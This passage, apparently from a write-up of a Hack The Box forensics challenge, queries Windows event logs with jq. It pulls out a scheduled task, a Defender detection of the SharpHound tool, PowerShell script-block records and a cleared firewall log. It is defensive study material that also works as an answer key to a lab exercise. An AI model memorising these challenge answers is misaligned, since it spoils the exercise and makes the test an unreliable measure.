</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Version&#34;</span>: <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>Task name was &ldquo;HTB-AUTOMATION&rdquo; and the contents were:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Task</span> <span style="color:#50fa7b">version=</span><span style="color:#f1fa8c">&#34;1.2&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">xmlns=</span><span style="color:#f1fa8c">&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;RegistrationInfo&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Date&gt;</span>2023-03-27T07:51:21.4599985<span style="color:#ff79c6">&lt;/Date&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Author&gt;</span>DESKTOP-887GK2L\\CyberJunkie<span style="color:#ff79c6">&lt;/Author&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Description&gt;</span>practice<span style="color:#ff79c6">&lt;/Description&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;URI&gt;</span>\\HTB-AUTOMATION<span style="color:#ff79c6">&lt;/URI&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/RegistrationInfo&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Triggers&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;CalendarTrigger&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;StartBoundary&gt;</span>2023-03-27T09:00:00<span style="color:#ff79c6">&lt;/StartBoundary&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Enabled&gt;</span>true<span style="color:#ff79c6">&lt;/Enabled&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;ScheduleByDay&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;DaysInterval&gt;</span>1<span style="color:#ff79c6">&lt;/DaysInterval&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/ScheduleByDay&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/CalendarTrigger&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/Triggers&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Principals&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Principal</span> <span style="color:#50fa7b">id=</span><span style="color:#f1fa8c">&#34;Author&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;RunLevel&gt;</span>LeastPrivilege<span style="color:#ff79c6">&lt;/RunLevel&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;UserId&gt;</span>DESKTOP-887GK2L\\CyberJunkie<span style="color:#ff79c6">&lt;/UserId&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;LogonType&gt;</span>InteractiveToken<span style="color:#ff79c6">&lt;/LogonType&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/Principal&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/Principals&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Settings&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;MultipleInstancesPolicy&gt;</span>IgnoreNew<span style="color:#ff79c6">&lt;/MultipleInstancesPolicy&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;DisallowStartIfOnBatteries&gt;</span>true<span style="color:#ff79c6">&lt;/DisallowStartIfOnBatteries&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;StopIfGoingOnBatteries&gt;</span>true<span style="color:#ff79c6">&lt;/StopIfGoingOnBatteries&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;AllowHardTerminate&gt;</span>true<span style="color:#ff79c6">&lt;/AllowHardTerminate&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;StartWhenAvailable&gt;</span>false<span style="color:#ff79c6">&lt;/StartWhenAvailable&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;RunOnlyIfNetworkAvailable&gt;</span>false<span style="color:#ff79c6">&lt;/RunOnlyIfNetworkAvailable&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;IdleSettings&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Duration&gt;</span>PT10M<span style="color:#ff79c6">&lt;/Duration&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;WaitTimeout&gt;</span>PT1H<span style="color:#ff79c6">&lt;/WaitTimeout&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;StopOnIdleEnd&gt;</span>true<span style="color:#ff79c6">&lt;/StopOnIdleEnd&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;RestartOnIdle&gt;</span>false<span style="color:#ff79c6">&lt;/RestartOnIdle&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/IdleSettings&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;AllowStartOnDemand&gt;</span>true<span style="color:#ff79c6">&lt;/AllowStartOnDemand&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Enabled&gt;</span>true<span style="color:#ff79c6">&lt;/Enabled&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Hidden&gt;</span>false<span style="color:#ff79c6">&lt;/Hidden&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;RunOnlyIfIdle&gt;</span>false<span style="color:#ff79c6">&lt;/RunOnlyIfIdle&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;WakeToRun&gt;</span>false<span style="color:#ff79c6">&lt;/WakeToRun&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;ExecutionTimeLimit&gt;</span>P3D<span style="color:#ff79c6">&lt;/ExecutionTimeLimit&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Priority&gt;</span>7<span style="color:#ff79c6">&lt;/Priority&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/Settings&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Actions</span> <span style="color:#50fa7b">Context=</span><span style="color:#f1fa8c">&#34;Author&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Exec&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Command&gt;</span>C:\\Users\\CyberJunkie\\Desktop\\Automation-HTB.ps1<span style="color:#ff79c6">&lt;/Command&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;Arguments&gt;</span>-A cyberjunkie@hackthebox.eu<span style="color:#ff79c6">&lt;/Arguments&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/Exec&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/Actions&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/Task&gt;</span>
</span></span></code></pre></div><p>Windows Defend Antivirus threat detection event ID is <code>1117</code>. To list these events invoked by the use CyberJunkie we can use the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat all_events.json | jq <span style="color:#f1fa8c">&#39;select(.Event.System.EventID==1117 and .Event.EventData.&#34;Detection User&#34;==&#34;DESKTOP-887GK2L\\CyberJunkie&#34;)&#39;</span> -c | tail -n1
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Event&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;xmlns&#34;</span>: <span style="color:#f1fa8c">&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;EventData&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Action ID&#34;</span>: <span style="color:#f1fa8c">&#34;2&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Action Name&#34;</span>: <span style="color:#f1fa8c">&#34;Quarantine&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Additional Actions ID&#34;</span>: <span style="color:#f1fa8c">&#34;0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Additional Actions String&#34;</span>: <span style="color:#f1fa8c">&#34;No additional actions required&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Category ID&#34;</span>: <span style="color:#f1fa8c">&#34;34&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Category Name&#34;</span>: <span style="color:#f1fa8c">&#34;Tool&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Detection ID&#34;</span>: <span style="color:#f1fa8c">&#34;{0EBC4BEA-5532-4EFB-8A34-64F91CC8702E}&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Detection Time&#34;</span>: <span style="color:#f1fa8c">&#34;2023-03-27T14:42:34.272Z&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Detection User&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-887GK2L\\CyberJunkie&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Engine Version&#34;</span>: <span style="color:#f1fa8c">&#34;AM: 1.1.20100.6, NIS: 1.1.20100.6&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Error Code&#34;</span>: <span style="color:#f1fa8c">&#34;0x80508023&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Error Description&#34;</span>: <span style="color:#f1fa8c">&#34;The program could not find the malware and other potentially unwanted software on this device. &#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Execution ID&#34;</span>: <span style="color:#f1fa8c">&#34;0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Execution Name&#34;</span>: <span style="color:#f1fa8c">&#34;Unknown&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;FWLink&#34;</span>: <span style="color:#f1fa8c">&#34;https://go.microsoft.com/fwlink/?linkid=37020&amp;name=HackTool:MSIL/SharpHound!MSR&amp;threatid=2147814944&amp;enterprise=0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Origin ID&#34;</span>: <span style="color:#f1fa8c">&#34;4&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Origin Name&#34;</span>: <span style="color:#f1fa8c">&#34;Internet&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Path&#34;</span>: <span style="color:#f1fa8c">&#34;containerfile:_C:\\Users\\CyberJunkie\\Downloads\\SharpHound-v1.1.0.zip; file:_C:\\Users\\CyberJunkie\\Downloads\\SharpHound-v1.1.0.zip-&gt;SharpHound.exe; webfile:_C:\\Users\\CyberJunkie\\Downloads\\SharpHound-v1.1.0.zip|https://objects.githubusercontent.com/github-production-release-asset-2e65be/385323486/70d776cc-8f83-44d5-b226-2dccc4f7c1e3?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230327%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20230327T144228Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=f969ef5ca3eec150dc1e23623434adc1e4a444ba026423c32edf5e85d881a771&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=385323486&amp;response-content-disposition=attachment%3B%20filename%3DSharpHound-v1.1.0.zip&amp;response-content-type=application%2Foctet-stream|pid:3532,ProcessStart:133244017530289775&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Post Clean Status&#34;</span>: <span style="color:#f1fa8c">&#34;0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Pre Execution Status&#34;</span>: <span style="color:#f1fa8c">&#34;0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Process Name&#34;</span>: <span style="color:#f1fa8c">&#34;Unknown&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Product Name&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft Defender Antivirus&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Product Version&#34;</span>: <span style="color:#f1fa8c">&#34;4.18.2302.7&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Remediation User&#34;</span>: <span style="color:#f1fa8c">&#34;NT AUTHORITY\\SYSTEM&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Security intelligence Version&#34;</span>: <span style="color:#f1fa8c">&#34;AV: 1.385.1261.0, AS: 1.385.1261.0, NIS: 1.385.1261.0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Severity ID&#34;</span>: <span style="color:#f1fa8c">&#34;4&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Severity Name&#34;</span>: <span style="color:#f1fa8c">&#34;High&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Source ID&#34;</span>: <span style="color:#f1fa8c">&#34;4&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Source Name&#34;</span>: <span style="color:#f1fa8c">&#34;Downloads and attachments&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;State&#34;</span>: <span style="color:#f1fa8c">&#34;2&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Status Code&#34;</span>: <span style="color:#f1fa8c">&#34;103&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Status Description&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Threat ID&#34;</span>: <span style="color:#f1fa8c">&#34;2147814944&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Threat Name&#34;</span>: <span style="color:#f1fa8c">&#34;HackTool:MSIL/SharpHound!MSR&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Type ID&#34;</span>: <span style="color:#f1fa8c">&#34;0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Type Name&#34;</span>: <span style="color:#f1fa8c">&#34;Concrete&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Unused&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Unused2&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Unused3&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Unused4&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Unused5&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Unused6&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;System&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Channel&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft-Windows-Windows Defender/Operational&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Computer&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-887GK2L&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Correlation&#34;</span>: null,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EventID&#34;</span>: 1117,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EventRecordID&#34;</span>: 444,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Execution&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ProcessID&#34;</span>: 3300,
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ThreadID&#34;</span>: <span style="color:#bd93f9">3056</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Keywords&#34;</span>: <span style="color:#f1fa8c">&#34;0x8000000000000000&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Level&#34;</span>: 4,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Opcode&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Provider&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Guid&#34;</span>: <span style="color:#f1fa8c">&#34;11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Name&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft-Windows-Windows Defender&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Security&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;UserID&#34;</span>: <span style="color:#f1fa8c">&#34;S-1-5-18&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Task&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;TimeCreated&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;SystemTime&#34;</span>: <span style="color:#f1fa8c">&#34;2023-03-27T14:42:48.353664Z&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Version&#34;</span>: <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>To List the commands executed on PowerShell by the user <code>CyberJunkie</code> we need two pieces of Information.</p>
<ol>
<li>We need the time when CyberJunkie user logged on to the System.</li>
<li>We need the PowerShell Script Block Execution Event ID which is <code>4104</code></li>
</ol>
<p>Correlating this two pieces of data we can extract the commands ran by the user CyberJunkie.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat all_events.json | jq <span style="color:#f1fa8c">&#39;select(.Event.System.EventID==4104 and .Event.System.TimeCreated.&#34;#attributes&#34;.SystemTime &gt; &#34;2023-03-27T14:38:32.937458Z&#34;) .Event.EventData.ScriptBlockText&#39;</span>       
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;prompt&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Get-FileHash -Algorithm md5 .\\Desktop\\Automation-HTB.ps1&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;prompt&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Use Zimmerman&#39;s EvtxECmd.exe for future Windows Event Log Analysis. It flattens the JSON fields to almost 1 level deep, which can be very useful to query using **jq**
</span></span></code></pre></div><p>Finding the deleted System Event log after CyberJunkie logged on to the system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat all_events.json | jq <span style="color:#f1fa8c">&#39;select(.Event.System.EventID==104 and .Event.System.TimeCreated.&#34;#attributes&#34;.SystemTime &gt; &#34;2023-03-27T14:38:32.937458Z&#34;)&#39;</span>       
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Event&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;xmlns&#34;</span>: <span style="color:#f1fa8c">&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;System&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Channel&#34;</span>: <span style="color:#f1fa8c">&#34;System&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Computer&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-887GK2L&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Correlation&#34;</span>: null,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EventID&#34;</span>: 104,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EventRecordID&#34;</span>: 2186,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Execution&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ProcessID&#34;</span>: 1332,
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ThreadID&#34;</span>: <span style="color:#bd93f9">5332</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Keywords&#34;</span>: <span style="color:#f1fa8c">&#34;0x8000000000000000&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Level&#34;</span>: 4,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Opcode&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Provider&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Guid&#34;</span>: <span style="color:#f1fa8c">&#34;{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Name&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft-Windows-Eventlog&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Security&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;UserID&#34;</span>: <span style="color:#f1fa8c">&#34;S-1-5-21-3393683511-3463148672-371912004-1001&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Task&#34;</span>: 104,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;TimeCreated&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;SystemTime&#34;</span>: <span style="color:#f1fa8c">&#34;2023-03-27T15:01:56.515836Z&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Version&#34;</span>: <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;UserData&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;LogFileCleared&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;xmlns&#34;</span>: <span style="color:#f1fa8c">&#34;http://manifests.microsoft.com/win/2004/08/windows/eventlog&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;BackupPath&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Channel&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft-Windows-Windows Firewall With Advanced Security/Firewall&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;SubjectDomainName&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-887GK2L&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;SubjectUserName&#34;</span>: <span style="color:#f1fa8c">&#34;CyberJunkie&#34;</span>
